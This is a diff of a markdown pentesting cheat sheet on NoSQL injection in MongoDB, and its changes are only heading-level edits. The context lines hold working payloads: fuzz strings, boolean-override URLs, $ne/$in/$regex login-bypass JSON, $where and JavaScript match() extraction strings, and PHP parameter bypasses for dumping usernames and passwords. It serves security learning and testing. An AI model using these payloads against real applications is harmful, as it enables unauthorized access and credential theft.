@@ -4,11 +4,11 @@ title: NoSQL Injection (NoSQLi)
 
 NoSQL injection attacks can be especially dangerous because code
 
-# Introduction
+## Introduction
 
 NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution.
 
-## Types of NoSQLi
+### Types of NoSQLi
 
 There are two different types of NoSQLi:
 
@@ -16,11 +16,11 @@ There are two different types of NoSQLi:
 * **Operator injection**: This occurs when you can use NoSQL query operators to manipulate queries.
 
 
-# NoSQL Syntax injection
+## NoSQL Syntax injection
 
 We can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this we can systematicaally test each input by submitting fuzz strings and special characters that trigger a databaase error.
 
-## Detecting syntax injection in MongoDB
+### Detecting syntax injection in MongoDB
 
 To test whether the input may be vulnerable, submit a fuzz string.
 
@@ -31,7 +31,7 @@ Example of fuzzing:
 '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
 ```
 
-### Determining which characters are processed
+#### Determining which characters are processed
 
 To determine which characters are interpreted as syntax by the application, you can inject indiviual characters.
 
@@ -42,7 +42,7 @@ this.category == '''
 this.category == '\''
 ```
 
-### Confirming conditional behaviour
+#### Confirming conditional behaviour
 
 After detecting the vulnerability, the next step is to determine whether you can influence boolena conditions using NoSQL syntax.
 
@@ -60,7 +60,7 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
 https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 ```
 
-### Overriding existing conditions
+#### Overriding existing conditions
 
 We can override the existing condition to a TRUE in order to exploit the vulnerability and get more results.
 
@@ -70,7 +70,7 @@ https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%
 this.category == 'fizzy'||'1'=='1'
 ```
 
-### Break the sentence
+#### Break the sentence
 
 We can also add a null character to break the original query.
 
@@ -79,7 +79,7 @@ test'%00
 test'\u0000
 ```
 
-# NoSQL Operator injection
+## NoSQL Operator injection
 
 NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include: 
 
@@ -88,7 +88,7 @@ NoSQL databases often use query operators, which provide ways to specify conditi
 * `$in`: Matches all of the values specified in an array.
 * `$regex`: Selects documents where values matches to an spceified regular expression.
 
-## Submitting query operators
+### Submitting query operators
 
 In JSON bodies we can use instead of `{"username":"benjugat"}`:
 
@@ -104,7 +104,7 @@ username[$ne]=invalid
 
 > **Note**: Try to convert `GET` requests to `POST` with `application/json` as a content type header.
 
-## Detecting operator injection in MongoDB
+### Detecting operator injection in MongoDB
 
 Consider a vulnerable app that accepts a username and password in the body of a `POST` request `{"username":"benjugat","password":"MyS3curePwd"}`.
 
@@ -124,12 +124,12 @@ The following payloads allows you to **bypass authentication**.
 {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 ```
 
-# Exploiting syntax injection to extract data
+## Exploiting syntax injection to extract data
 
 In many noSQL databases, some query operators or functions can run limited JavaScript code.
 
 
-## Exfiltrating data in MongoDB
+### Exfiltrating data in MongoDB
 
 Consider a vulnerable app that allows users to look up other registered usernames and displays their role.
 
@@ -155,7 +155,7 @@ We can also use the JS `match()` function to extract information such as identif
 admin' && this.password.match(/\d/) || 'a'=='b
 ```
 
-## Identifying field names
+### Identifying field names
 
 To identify whether the MongoDB database contains a `password` field, you could submit the following payload:
 
@@ -168,7 +168,7 @@ admin' && this.password!='
 > **Note**: We can use alternatively use NoSQL operator injection to extract field names.
 
 
-# Exploiting operator injection to extract data
+## Exploiting operator injection to extract data
 
 Consider a vulnerable application that accepts username and password in the body of a POST request: 
 
@@ -183,7 +183,7 @@ To test whether you can inject operators, we can try to add the `$where` operato
 {"username":"benjugat","password":"MyS3curePwd", "$where":"1"}
 ```
 
-## Extracting field names
+### Extracting field names
 
 We can use the `keys()` method to extract the name of data fields.
 
@@ -215,7 +215,7 @@ Once retrieved bruteforce the value of a key.
 ```
 
 
-# Login Bypass (PHP)
+## Login Bypass (PHP)
 
 Injecting the `$ne` :
 
@@ -224,11 +224,11 @@ Injecting the `$ne` :
 username[$ne]=&password[$ne]=&login=login
 ```
 
-## Dumping Database (PHP)
+### Dumping Database (PHP)
 
 First instead of `$ne` we are going to use `$regex` in order to discover character by character.
 
-### Get all Usernames
+#### Get all Usernames
 
 First we are going to see al type of characters used in the usernames.
 
@@ -341,7 +341,7 @@ Username: admin
 Username: mango
 ```
 
-### Get Passwords:
+#### Get Passwords:
 
 Same as users but remember to change the `$regex` of the user to `$ne` and the other way with password.
 
